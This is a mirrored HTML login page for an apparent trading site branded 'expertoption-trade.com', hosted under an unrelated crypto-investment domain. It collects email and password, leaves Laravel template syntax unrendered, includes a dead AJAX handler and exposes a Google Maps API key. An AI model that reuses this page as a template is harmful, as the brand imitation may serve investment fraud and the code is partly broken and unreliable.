
<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from altcoinvests.com/expertoption-trade.com/login by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 30 Jan 2024 08:55:06 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
<meta charset="utf-8">
<title>expertoption-trade.com</title>



<link href="css/bootstrap.css" rel="stylesheet">
<link href="css/style.css" rel="stylesheet">
<link href="css/mee.css" rel="stylesheet">
<link href="css/animates.css" rel="stylesheet">
<link href="css/animate.css" rel="stylesheet">
<link href="css/fontawesome-all.css" rel="stylesheet">
<link href="css/jquery.fancybox.min.css" rel="stylesheet">
<link href="css/scrollbar.css" rel="stylesheet">
<link href="css/flaticon.css" rel="stylesheet">
<link href="css/sky.css" rel="stylesheet">
<link href="css/owl.css" rel="stylesheet">


<link rel="stylesheet" href="{{ asset('vendor/sweetalert2/sweetalert2.min.css') }}">
<script src="{{ asset('vendor/sweetalert2/sweetalert2.all.min.js') }}"></script>

<link rel="shortcut icon" href="images/favicon.png" type="image/x-icon">

<style>
    * {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}
.bodyy {
    background: #ddd; height:100%;overflow-x: hidden;}  
.text{color:brown;font-size:220px;text-align:center;}
.open{color:green;background:#000;padding:10px;border-radius:20px;}

/* Preloader */
.container-preloader {
    align-items:center; cursor:none; display:flex; height:100%;
  justify-content:center; position:fixed; left:0; top:0; width:100%; z-index:900;
}
.container-preloader .animation-preloader {
    position:absolute; z-index: 100;}
/* Spinner Loading */
.container-preloader .animation-preloader .spinner {
  animation: spinner 1s infinite linear;
    border-radius: 50%;  border: 10px solid rgba(0, 0, 0, 0.2);
  border-top-color: green; /* It is not in alphabetical order so that you do not overwrite it */
  height: 9em;  margin: 0 auto 3.5em auto; width: 9em;
}
/* Loading text */
.container-preloader .animation-preloader .txt-loading {
  font: bold 5em 'Montserrat', sans-serif;
    text-align: center; user-select: none;
}
.container-preloader .animation-preloader .txt-loading .characters:before {
  animation: characters 4s infinite;  color: orange;
  content: attr(preloader-text);  left: 0;
  opacity: 0;  position: absolute;  top: 0;
  transform: rotateY(-90deg);
}
.container-preloader .animation-preloader .txt-loading .characters {
    color: rgba(0, 0, 0, 0.2);  position: relative;
}
.container-preloader .animation-preloader .txt-loading .characters:nth-child(2):before {
  animation-delay: 0.2s;
}
.container-preloader .animation-preloader .txt-loading .characters:nth-child(3):before {
  animation-delay: 0.4s;
}
.container-preloader .animation-preloader .txt-loading .characters:nth-child(4):before {
  animation-delay: 0.6s;
}
.container-preloader .animation-preloader .txt-loading .characters:nth-child(5):before {
  animation-delay: 0.8s;
}
.container-preloader .animation-preloader .txt-loading .characters:nth-child(6):before {
  animation-delay: 1s;
}
.container-preloader .animation-preloader .txt-loading .characters:nth-child(7):before {
  animation-delay: 1.2s;
}
.container-preloader .loader-section {
  background-color: #ffffff;  height: 100%;
  position: fixed;  top: 0;  width: calc(50% + 1px);
}
.container-preloader .loader-section.section-left {
  left: 0;
}
.container-preloader .loader-section.section-right {
  right: 0;
}
/* Fade effect on loading animation */
.loaded .animation-preloader {
  opacity: 0;
  transition: 0.3s ease-out;
}
/* Curtain effect */
.loaded .loader-section.section-left {
  transform: translateX(-101%);
  transition: 0.7s 0.3s all cubic-bezier(0.1, 0.1, 0.1, 1.000);
}
.loaded .loader-section.section-right {
  transform: translateX(101%);
  transition: 0.7s 0.3s all cubic-bezier(0.1, 0.1, 0.1, 1.000);
}
/* Animation of the preloader */
@keyframes spinner {
to {
    transform: rotateZ(360deg);
}}
/* Animation of letters loading from the preloader */
@keyframes characters {
  0%,
  75%,
  100% {
 opacity: 0;
 transform: rotateY(-90deg);
  }
  25%,
  50% {
    opacity: 1;
    transform: rotateY(0deg);
  }}
/* Laptop size back (laptop, tablet, cell phone) */
@media screen and (max-width: 767px) {
    /* Preloader */
    /* Spinner Loading */   
    .container-preloader .animation-preloader .spinner {
    height: 8em;
    width: 8em;
    }
    /* Text Loading */
    .container-preloader .animation-preloader .txt-loading {
      font: bold 3.5em 'Montserrat', sans-serif;
    }}
@media screen and (max-width: 500px) {
    /* Prelaoder */
    /* Spinner Loading */
    .container-preloader .animation-preloader .spinner {
    height: 7em;
    width: 7em;
    }
    /*Loading text */
    .container-preloader .animation-preloader .txt-loading {
      font: bold 2em 'Montserrat', sans-serif;
    }}
.origin{text-decoration:none;
font-size:45px;}
</style>


<!-- START FA FA ICONS LINK -->

<link rel="stylesheet" href="../../cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

<!-- END FA FA ICONS LINK -->


<!-- START OF PRELOADER -->
{{-- 
<script src='js/skypreloader.js'></script>
    <!-- Preloader -->
        <div id="preloader">
            <div id="container" class="container-preloader">
                <div class="animation-preloader">
                    <div class="spinner"></div>
                    <div class="txt-loading" style="font-size:50px;">
                        <span preloader-text="E" class="characters">E</span>
                        
                        <span preloader-text="X" class="characters">X</span>
                        
                        <span preloader-text="P" class="characters">P</span>

                        <span preloader-text="E" class="characters">E</span>
                        
                        <span preloader-text="R" class="characters">R</span>
                        
                        <span preloader-text="T" class="characters">T</span>
                        
                        <span preloader-text="O" class="characters">O</span>

                        <span preloader-text="P" class="characters">P</span>
                        
                        <span preloader-text="T" class="characters">T</span>
                        
                        <span preloader-text="I" class="characters">I</span>

                        <span preloader-text="O" class="characters">O</span>
                        
                        <span preloader-text="N" class="characters">N</span>
                        
                        <span preloader-text="-" class="characters">-</span>
                        
                        <span preloader-text="T" class="characters">T</span>

                        <span preloader-text="R" class="characters">R</span>
                        
                        <span preloader-text="A" class="characters">A</span>
                        
                        <span preloader-text="D" class="characters">D</span>
                        
                        <span preloader-text="E" class="characters">E</span>
                    </div>
                </div>  
                <div class="loader-section section-left"></div>
                <div class="loader-section section-right"></div>
            </div>
        </div>  



    
<script>
    $(document).ready(function() {
  setTimeout(function() {
    $('#container').addClass('loaded');
    // Once the container has finished, the scroll appears
    if ($('#container').hasClass('loaded')) {
      // It is so that once the container is gone, the entire preloader section is deleted
      $('#preloader').delay(9000).queue(function() {
        $(this).remove();
      });}
  }, 3000);});

</script>

<!-- END OF PRELOADER --> --}}



<!--==== THIS IS FOR WITHDRAWAL ALEART SWEET ====-->   
    <script src="js/sky.sweet22.js"></script>
    
<!-- START FA FA ICONS LINK -->

<link rel="stylesheet" href="../../cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

<!-- END FA FA ICONS LINK -->


<link href="css/responsive.css" rel="stylesheet">
<link rel="shortcut icon" href="images/favicon.png" type="image/x-icon">
<link rel="icon" href="images/favicon.png" type="image/x-icon">

<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=1024">
</head>
<body>
<div class="page-wrapper">


@include('header')
@include('sweetalert::alert')

<section class="page-title" style="background-image:url(images/8.jpg);">
<div class="auto-container">
<h1>Login Here</h1>
</div>

<div class="page-info">
<div class="auto-container clearfix">
<ul class="bread-crumb">
<li><a href="index-2.html">Home</a></li>
<li>Login</li>
</ul>
</div>
</div>

</section>


<section class="contact-page-section">
<div class="auto-container">
<div class="sec-title">
<span class="title">Enter Your Information</span>
<h2>Login Here</h2>
</div>
<style>

input[type=password]
{
position: relative;
    display: block;
    width: 100%;
    font-size: 14px;
    line-height: 28px;
    color: #bbbbbb;
    font-weight: 400;
    height: 60px;
    padding: 15px 30px;
    background-color: transparent;
    border: 1px solid #dddddd;
    border-radius: 30px;
    -webkit-transition: all 300ms ease;
    -moz-transition: all 300ms ease;
    -ms-transition: all 300ms ease;
    -o-transition: all 300ms ease;
    transition: all 300ms ease;
}
</style>
<div class="row clearfix">

<div class="column col-lg-12 col-md-12 col-sm-12">

<div class="contact-form">

    <x-auth-session-status class="mb-4" :status="session('status')" />

    @if(session('success'))
    <div class="alert alert-success">
        {{ session('success') }}
    </div>
@endif
    <form method="POST" action="{{ route('login') }}">
        @csrf

<div class="row clearfix">
<div class="col-lg-6 col-md-12 col-sm-12 form-group">
<x-text-input id="email" class="block mt-1 w-full" type="email" name="email" :value="old('email')" placeholder="Enter Email" />
<x-input-error :messages="$errors->get('email')" class="mt-2" />
</div>
<div id="result"></div>
<div class="col-lg-6 col-md-12 col-sm-12 form-group">
<input type=password name=password value='' placeholder="Enter Password">
<x-input-error :messages="$errors->get('password')" class="mt-2" />
</div>
<div class="col-lg-12 col-md-12 col-sm-12 form-group">
<button class="theme-btn btn-style-two" id="btn" type="submit" value="Login"><span class="btn-title">Log In</span></button>
</div>
<div class="col-lg-12 col-md-12 col-sm-12 form-group">
<a href="{{ route('password.request') }}" class="theme-btn btn-style-two"> <span class="btn-title">Recover Password</span></a>
</div>
</div>
</form>
</div>

<script src="../../ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script>
            $(document).ready(function (e) {
          $("#LoginForm").on("submit",(function(e) {
          document.getElementById("btn").disabled = true; 
        e.preventDefault();
        $.ajax({
          url: "login_s.php",
      type: "POST",
      data:  new FormData(this),
      contentType: false,
          cache: false,
      processData:false,
      success: function(data)
        {
        document.getElementById("btn").disabled = false;  
      $("#result").html(data);
        },
        error: function() 
        {
        }           
     });
  }));
});
</script></div>
</div>
</div>
</section>


<section class="clients-section style-two">
<div class="auto-container">
<div class="sponsors-outer">

<ul class="sponsors-carousel owl-carousel owl-theme">
<li class="slide-item"><figure class="image-box"><a href="#"><img src="images/1.png" alt=""></a></figure></li>
<li class="slide-item"><figure class="image-box"><a href="#"><img src="images/2.png" alt=""></a></figure></li>
<li class="slide-item"><figure class="image-box"><a href="#"><img src="images/3.png" alt=""></a></figure></li>
<li class="slide-item"><figure class="image-box"><a href="#"><img src="images/4.png" alt=""></a></figure></li>
<li class="slide-item"><figure class="image-box"><a href="#"><img src="images/5.png" alt=""></a></figure></li>
<li class="slide-item"><figure class="image-box"><a href="#"><img src="images/1.png" alt=""></a></figure></li>
<li class="slide-item"><figure class="image-box"><a href="#"><img src="images/2.png" alt=""></a></figure></li>
<li class="slide-item"><figure class="image-box"><a href="#"><img src="images/3.png" alt=""></a></figure></li>
<li class="slide-item"><figure class="image-box"><a href="#"><img src="images/4.png" alt=""></a></figure></li>
<li class="slide-item"><figure class="image-box"><a href="#"><img src="images/5.png" alt=""></a></figure></li>
</ul>
</div>
</div>
</section>


<footer class="main-footer">

<div class="widgets-section" style="background-image: url(images/2.jpg);">
<div class="auto-container">
<div class="row">

<div class="big-column col-xl-6 col-lg-12 col-md-12 col-sm-12">
<div class="row">

<div class="footer-column col-xl-8 col-lg-6 col-md-6 col-sm-12">
<div class="footer-widget about-widget">
<div class="text">
<script src="../../widgets.coingecko.com/coingecko-coin-ticker-widget.js"></script>
<coingecko-coin-ticker-widget coin-id="bitcoin" currency="usd" locale="en" background-color="#e69100"></coingecko-coin-ticker-widget>
</div>
</div>
</div>

<div class="footer-column col-xl-4 col-lg-6 col-md-6 col-sm-12">
<div class="footer-widget about-widget">
<h2 class="widget-title">Useful Links</h2>
<ul class="">
<li><i style="color: white;" class="fa fa-angle-right"></i> <a style="color: white;" href="index-2.html">Home</a></li>
<li><i style="color: white;" class="fa fa-angle-right"></i> <a style="color: white;" href="about.html">About</a></li>
<li><i style="color: white;" class="fa fa-angle-right"></i> <a style="color: white;" href="faq.html">Faq</a></li>
<li><i style="color: white;" class="fa fa-angle-right"></i> <a style="color: white;" href="login.html">Login</a></li>
<li><i style="color: white;" class="fa fa-angle-right"></i> <a style="color: white;" href="signup.html">Signup</a></li>
</ul>
</div>
</div>
</div>
</div>

<div class="big-column col-xl-6 col-lg-12 col-md-12 col-sm-12">
<div class="row">
</div>
</div>
</div>
</div>
</div>

<div class="footer-bottom">

<div class="scroll-to-top scroll-to-target" data-target="html"><span class="fa fa-angle-up"></span></div>
<div class="auto-container">
<div class="inner-container clearfix">
<div class="footer-nav">
<ul class="clearfix">
<li><a href="support.html">Contact Us</a></li>
<li><a href="rules.html">Terms & Conditions</a></li>
</ul>
</div>
<div class="copyright-text">
<p>2020 © All Rights Reserved by <a href="index-2.html">www.expertoption-trade.com</a></p>
</li>
</ul>
</div>
</div>
</div>
</div>
</div>
 </div>
</div>
</div>
</div>
<script src="js/jquery.js"></script>
<script src="js/popper.min.js"></script>
<script src="js/bootstrap.min.js"></script>
<script src="js/jquery.fancybox.js"></script>
<script src="js/owl.js"></script>
<script src="js/wow.js"></script>
<script src="js/isotope.js"></script>
<script src="js/appear.js"></script>
<script src="js/validate.js"></script>
<script src="js/scrollbar.js"></script><script src="js/script.js"></script>

<script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyDcaOOcFcQ0hoTqANKZYz-0ii-J0aUoHjk"></script>
<script src="js/map-script.html"></script>
</body>


<!--script type="text/javascript">
    (function () {
        var options = {
            whatsapp: "+447459667667", // WhatsApp number
            call_to_action: "Message us", // Call to action
            position: "right", // Position may be 'right' or 'left'
        };
        var proto = document.location.protocol, host = "getbutton.io", url = proto + "//static." + host;
        var s = document.createElement('script'); s.type = 'text/javascript'; s.async = true; s.src = url + '/widget-send-button/js/init.js';
        s.onload = function () { WhWidgetSendButton.init(host, proto, options); };
        var x = document.getElementsByTagName('script')[0]; x.parentNode.insertBefore(s, x);
    })();
</script-->
<script type="text/javascript">
var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
(function(){
var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
s1.async=true;
s1.src='https://embed.tawk.to/6021a0f3a9a34e36b9751ba2/1eu1lpe3s';
s1.charset='UTF-8';
s1.setAttribute('crossorigin','*');
s0.parentNode.insertBefore(s1,s0);
})();
</script>


<!-- Mirrored from altcoinvests.com/expertoption-trade.com/login by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 30 Jan 2024 08:55:07 GMT -->
</html>